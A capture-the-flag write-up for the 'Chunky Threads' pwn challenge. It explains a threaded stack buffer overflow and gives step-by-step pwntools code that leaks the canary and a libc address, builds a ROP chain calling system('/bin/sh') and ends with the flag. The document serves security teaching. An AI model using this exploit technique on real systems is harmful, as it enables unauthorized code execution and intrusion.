# Chunky Threads

## Challenge Summary

- **Category**: Pwn  
- **Points**: 168  
- **Solves**: 87 teams

---

### Problem Description

> Give the chonk a chunk and he just gets chonkier. Teach him to chunk and he will forestack smashing detected.

---

## Challenge Structure

The binary accepts commands that create threads executing a vulnerable print function. It supports:

- `CHUNKS N`: sets the max number of threads (max: 10)  
- `CHUNK timeout repeat msg`: spawns a thread that prints `msg` every `timeout` seconds, `repeat` times  
- `CHONK`: prints `"chonk"`

Each thread calls a function that performs a `memcpy()` into a fixed-size buffer on the stack with user-controlled length, leading to a stack buffer overflow vulnerability.

---

### Protections:

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

---

## Exploitation Flow

### Step 1: Enable Thread Creation

Send `CHUNKS 10` to enable the maximum allowed threads. Required before creating any exploitable thread.

```python
r.sendline(b"CHUNKS 10")
r.recvuntil(b"10\\n")
```

---

### Step 2: Leak Stack Canary

Use an oversized message (`0x49` bytes) to overflow the buffer by 1 byte, causing `puts()` to leak part of the stack canary.

```python
payload = b"A" * 0x49
create_thread(r, 1000, 1, payload)
r.recvuntil(payload)
canary = u64(r.recv(7).strip().rjust(8, b"\\x00"))
```

---

### Step 3: Leak libc Address

Send a larger overflow (`0x58` bytes) to leak a return address from libc (`__start_thread`). Subtract a known offset to calculate libc base.

```python
payload = b"A" * 0x58
create_thread(r, 1000, 1, payload)
r.recvuntil(payload)
leaked = r.recvline().strip().ljust(8, b"\\x00")
libc_base = u64(leaked) - 0x9caa4
```

---

### Step 4: Build ROP Chain

With the canary and libc base, craft a ROP chain to call `system("/bin/sh")`. The payload is sent as the message buffer.

```python
rop = ROP(libc)
rop.raw(b"A" * 0x48)
rop.raw(canary)
rop.raw(0)
rop.raw(rop.ret)
rop.call(libc.sym.system, [next(libc.search(b"/bin/sh"))])
```

---

### Step 5: Trigger Execution

Send a thread with the final ROP payload and no delay. Once it returns from the `print()` function, the overwritten return address will trigger our ROP chain.

```python
create_thread(r, 0, 1, payload)
r.interactive()
```

---

## Flag

```bash
$ cat /flag.txt
L3AK{m30w_m30w_1n_th3_d4rk_y0u_c4n_r0p_l1k3_th4t_c4t}
```
